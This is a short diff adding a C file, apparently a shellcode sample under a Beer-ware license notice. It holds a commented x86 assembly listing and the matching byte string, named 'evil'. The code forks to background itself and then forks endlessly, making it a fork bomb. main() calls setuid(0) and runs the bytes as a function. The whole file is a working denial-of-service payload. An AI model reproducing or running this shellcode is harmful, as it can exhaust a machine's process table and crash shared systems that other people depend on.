@@ -1,0 +1,37 @@
+// ----------------------------------------------------------------------------
+// "THE BEER-WARE LICENSE" (Revision 43):
+// <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+// can do whatever you want with this stuff. If we meet some day, and you think
+// this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+// ----------------------------------------------------------------------------
+/*
+global _start
+section .text
+
+_start:
+; fork(void);
+	xor eax, eax
+	mov al,0x02
+	int 0x80
+	cmp eax,1	; if this is a child, or we have failed to clone
+	jl fork		; jump to the main code
+; exit(0);
+	xor eax,eax
+	mov al,0x1
+	xor ebx,ebx
+	int 0x80
+fork:
+	mov al, 0x02
+	int 0x80
+	jmp short fork
+
+*/
+
+const char evil[] = "\x31\xc0\xb0\x02\xcd\x80\x83\xf8\x01\x7c\x08\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xb0\x02\xcd\x80\xeb\xfa";
+
+typedef void (*shellcode)(void);
+void main(void)
+{
+	setuid(0);
+	((shellcode)evil)();
+}
